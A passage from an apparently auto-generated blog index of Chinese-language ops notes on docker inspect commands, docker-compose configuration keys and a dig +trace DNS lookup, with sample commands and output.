class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containers<span class="hljs-regexp">/61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f/</span><span class="hljs-number">61804</span>e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f-json.log<br></code></pre></td></tr></table></figure><h5 id="查看容器所使用镜像"><a href="#查看容器所使用镜像" class="headerlink" title="查看容器所使用镜像"></a>查看容器所使用镜像</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Image</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><p>查询结果为镜像id，docker images 查询的id为镜像id的前12位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➜  ~ docker inspect -f &#x27;&#123;&#123;.Image&#125;&#125;&#x27; <span class="hljs-number">61804e0083</span>af<br>sha<span class="hljs-number">256</span>:<span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">57780</span>d<span class="hljs-number">4</span>caa<span class="hljs-number">99</span>ba<span class="hljs-number">48e8867</span>d<span class="hljs-number">43532</span><span class="hljs-keyword">c</span><span class="hljs-number">72879</span>b<span class="hljs-number">31</span>ec<span class="hljs-number">0</span>b<span class="hljs-number">47</span>af<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>cfeb<span class="hljs-number">19</span><br>➜  ~ docker images | grep <span class="hljs-number">0</span>d<span class="hljs-number">3235</span><br>kalilinux/kali-rolling    latest       <span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">5</span>   <span class="hljs-number">14</span> months ago   <span class="hljs-number">140</span>MB<br></code></pre></td></tr></table></figure><h5 id="查看容器名"><a href="#查看容器名" class="headerlink" title="查看容器名"></a>查看容器名</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker inspect -f=<span class="hljs-string">&#x27;&#123;&#123;.Name&#125;&#125;&#x27;</span> 61804e0083af<br>/kali<br>➜  /tmp docker ps | grep 61804e0083af<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>                   15 months ago   Up 7 minutes                                        kali<br>➜  /tmp <br><br></code></pre></td></tr></table></figure><h5 id="查看容器内IP"><a href="#查看容器内IP" class="headerlink" title="查看容器内IP"></a>查看容器内IP</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.Networks.bridge.IPAddress</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp docker inspect -f=&#x27;&#123;&#123;.NetworkSettings.Networks.bridge.IPAddress&#125;&#125;&#x27; 61804e0083af<br><span class="hljs-number">172.17.0.2</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker exec -it 61804e0083af &quot;ifconfig&quot;<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255<br>        ether 02:42:ac:11:00:02  txqueuelen<span class="hljs-number"> 0 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 15 </span> bytes<span class="hljs-number"> 1322 </span>(1.2 KiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_install</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_install/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="安装指定版本docker"><a href="#安装指定版本docker" class="headerlink" title="安装指定版本docker"></a>安装指定版本docker</h4><h5 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h5><h3 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h2 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h2><h3 id="ubuntu-1"><a href="#ubuntu-1" class="headerlink" title="ubuntu"></a>ubuntu</h3><h3 id="redhat-1"><a href="#redhat-1" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac-1"><a href="#mac-1" class="headerlink" title="mac"></a>mac</h3><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_compose</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_compose/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_compose/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>项目（project）由一组关联的应用容器组成一个完整业务单元</p><p>服务（service）一个应用容器</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>指定yml基于的docker-compose版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">version</span>: &#x27;<span class="hljs-number">2</span>.<span class="hljs-number">3</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">services</span>:<br>  <span class="hljs-attribute">redis</span>:<br>    <span class="hljs-attribute">image</span>: redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>-alpine<br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>指定容器运行的镜像</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">image:</span> redis<br><span class="hljs-params">image:</span> ubuntu:<span class="hljs-number">14.04</span><br><span class="hljs-params">image:</span> example-registry.com:<span class="hljs-number">4000</span><span class="hljs-symbol">/postgresql</span><br><span class="hljs-params">image:</span> a4bc65fd <span class="hljs-comment"># 镜像id</span><br><span class="hljs-params">image:</span> vulhub<span class="hljs-operator">/</span>airflow:<span class="hljs-number">1.10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>添加环境变量，值可以为数组、字典或布尔值，布尔值需要使用引号，否则YML解析器转换为 True 或 False</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:12-alpine</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker docker-compose <span class="hljs-keyword">up</span> <br>Creating network <span class="hljs-string">&quot;docker_default&quot;</span> with the default driver<br>Pulling pgsql (postgre<span class="hljs-variable">s:12</span>-alpine)...<br><span class="hljs-number">12</span>-alpine: Pulling from library/postgres<br><span class="hljs-number">9</span>b18e9b68314: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">75</span>aada9edfc5: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">820773693750</span>: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">83</span>dc43929537: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">92</span>e2c19af124: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">52</span>f242e5c209: Pull <span class="hljs-built_in">complete</span><br>e0a8c8565c42: Pull <span class="hljs-built_in">complete</span><br>a424ab832487: Pull <span class="hljs-built_in">complete</span><br>Digest: <span class="hljs-built_in">sha256</span>:<span class="hljs-number">55</span>fb7ba926381c2ac1f8f58bb181dd932f140aa467c3097a07c6815648dbc5e2<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> postgre<span class="hljs-variable">s:12</span>-alpine<br>Creating docker_pgsql_1 ... done<br>Attaching <span class="hljs-keyword">to</span> docker_pgsql_1<br><br>➜  ~ docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS      NAMES<br><span class="hljs-number">34264</span>c6a3d67   postgre<span class="hljs-variable">s:12</span>-alpine   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">55</span> seconds ago   Up <span class="hljs-number">54</span> seconds   <span class="hljs-number">5432</span>/tcp   docker_pgsql_1<br><br></code></pre></td></tr></table></figure><h3 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h3><p>设置依赖关系</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><p>docker-compose up：按照依赖关系启动服务，例如：先启动db和redis，再启动web，但是并不是说必须等db和redis启动完成再启动web</p><p>docker-compose up SERVICE：自动包含指定SERVER的依赖项</p><p>docker-compose stop ：按照依赖关系停止服务</p><h3 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">gitlab</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/gitlab:13.10.1</span><br>  <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">postgresql</span><br>  <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:80&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;10022:22&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;443&quot;</span><br></code></pre></td></tr></table></figure><p>绑定容器的8080到主机的80</p><p>绑定容器的443到主机的任意端口，取决于容器启动时的随机端口</p><h3 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:11.9-alpine</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=gitlabhq_production</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">DB_EXTENSION=pg_trgm</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./load-extensions.sh:/docker-entrypoint-initdb.d/load-extensions.sh</span><br></code></pre></td></tr></table></figure><p>主机文件或数据卷挂载到容器中</p><h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">namenode</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/hadoop:2.8.1</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">CLUSTER_NAME=vulhub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_replication=1</span><br>  <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/namenode.sh</span><br></code></pre></td></tr></table></figure><p>覆盖容器启动的默认命令</p><h3 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">healthcheck:</span><br><span class="hljs-symbol">  test:</span> [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;pg_isready&quot;</span>, <span class="hljs-string">&quot;-U&quot;</span>, <span class="hljs-string">&quot;airflow&quot;</span>] <span class="hljs-meta">#设置检查程序</span><br><span class="hljs-symbol">  interval:</span> <span class="hljs-number">1</span>m5s <span class="hljs-meta">#设置检测间隔</span><br><span class="hljs-symbol">  retries:</span> <span class="hljs-number">5</span> <span class="hljs-meta">#设置重试次数</span><br><span class="hljs-symbol">  timeout:</span> <span class="hljs-number">10</span> <span class="hljs-meta">#设置超时时间</span><br><span class="hljs-symbol">  start_period:</span> <span class="hljs-number">1</span>m40s <span class="hljs-meta">#设置程序启动多久后开始检测</span><br></code></pre></td></tr></table></figure><h3 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h3><p>指定容器名称，而非默认生成的名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">container_name: <span class="hljs-keyword">my</span>-container<br></code></pre></td></tr></table></figure><h3 id="devices"><a href="#devices" class="headerlink" title="devices"></a>devices</h3><p>指定设备映射列表</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">devices:</span> <br>    - <span class="hljs-string">&quot;/dev/ttyUSB0:/dev/ttyUSB0&quot;</span><br></code></pre></td></tr></table></figure><h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>自定义DNS服务器，可以为单个值，也可以为列表</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dns</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8.8.8.8</span><br><br><span class="hljs-attribute">dns</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114</span><br></code></pre></td></tr></table></figure><h3 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a>dns_search</h3><p>自定义DNS搜索域，可以为单个值，也可以为列表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns_search: ns1<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br><br>dns_search: <br>    - ns2<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br>    - ns3<span class="hljs-selector-class">.test</span>.com<br></code></pre></td></tr></table></figure><h3 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h3><p>从文件中添加环境变量</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.env</span><br><br><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">envfile2.env</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./envfile3.env</span><br><br></code></pre></td></tr></table></figure><h3 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h3><p>暴露端口，但不映射到宿主机，也就是说只有内部可使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">expose:</span> <br>    - <span class="hljs-string">&quot;3333&quot;</span><br>    - <span class="hljs-string">&quot;6666&quot;</span><br></code></pre></td></tr></table></figure><h3 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a>extra_hosts</h3><p>添加主机名映射，在容器&#x2F;etc&#x2F;hosts中创建主机名和IP绑定关系</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">extra_hosts:</span> <br>     - <span class="hljs-string">&quot;newhost:1.1.1.1&quot;</span><br>     - <span class="hljs-string">&quot;oldhost:2.2.2.2&quot;</span><br></code></pre></td></tr></table></figure><h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h3><p>服务日志记录配置</p><p>di r</p><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p>指定镜像构建上下文路径</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dns_record_operation</title>
    <link href="/2024/02/06/network/dns/dns_record_operation/"/>
    <url>/2024/02/06/network/dns/dns_record_operation/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>对常见的DNS记录及操作学习总结</p><h1 id="常见DNS记录"><a href="#常见DNS记录" class="headerlink" title="常见DNS记录"></a>常见DNS记录</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="常见通用操作"><a href="#常见通用操作" class="headerlink" title="常见通用操作"></a>常见通用操作</h1><h2 id="dig-trace-查询"><a href="#dig-trace-查询" class="headerlink" title="dig trace 查询"></a>dig trace 查询</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>dig +trace domain</strong></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、直接从根域名服务器开始查询</p><p>2、本机代替递归服务器（本地DNS服务器）完成迭代查询</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、本地设备向根域名服务器（.） 查询 bilibili.com</p><p><img src="/image-20241225191304588.png" alt="image-20241225191304588"></p><p>2、根域名服务器识别为.com顶级域，告知需要去顶级域名服务器（.com)查询，并将顶级域名服务器返回给本地设备</p><p><img src="/image-20241225191338413.png" alt="image-20241225191338413"></p><p>3、本地设备又向顶级域名服务器请求查询bilibili.com</p><p><img src="/image-20241225191403683.png" alt="image-20241225191403683"></p><p>4、.com顶级域名服务器没有bilibili.com记录，告知需要去查询的域名服务器</p><p><img src="/image-20241225191431654.png" alt="image-20241225191431654"></p><p>5、本地设备再次向上一步请求返回的域名服务器发起请求</p><p><img src="/image-20241225191451787.png" alt="image-20241225191451787"></p><p>6、返回查询结果</p><p><img src="/image-20241225191523680.png" alt="image-20241225191523680"></p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs mercury">root@iZbp1191gh7vw52537lyxrZ:~# dig +<span class="hljs-keyword">trace</span> bilibili.com<br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span>.<span class="hljs-number">18</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">22.04</span>.<span class="hljs-number">2</span>-Ubuntu &lt;&lt;&gt;&gt; +<span class="hljs-keyword">trace</span> bilibili.com<br>;; global options: +cmd<br>.<span class="hljs-number">9</span>INNSf.root-servers.net.<br>.<span class="hljs-number">9</span>INNSd.root-servers.net.<br>.<span class="hljs-number">9</span>INNSg.root-servers.net.<br>.<span class="hljs-number">9</span>INNSh.root-servers.net.<br>.<span class="hljs-number">9</span>INNSa.root-servers.net.<br>.<span class="hljs-number">9</span>INNSc.root-servers.net.<br>.<span class="hljs-number">9</span>INNSk.root-servers.net.<br>.<span class="hljs-number">9</span>INNSb.root-servers.net.<br>.<span class="hljs-number">9</span>INNSl.root-servers.net.<br>.<span class="hljs-number">9</span>INNSm.root-servers.net.<br>.<span class="hljs-number">9</span>INNSj.root-servers.net.<br>.<span class="hljs-number">9</span>INNSi.root-servers.net.<br>.<span class="hljs-number">9</span>INNSe.root-servers.net.<br>;; Received <span class="hljs-number">239</span> bytes from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>) in <span class="hljs-number">0</span> ms<br><br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>#<span class="hljs-number">53</span>(<span 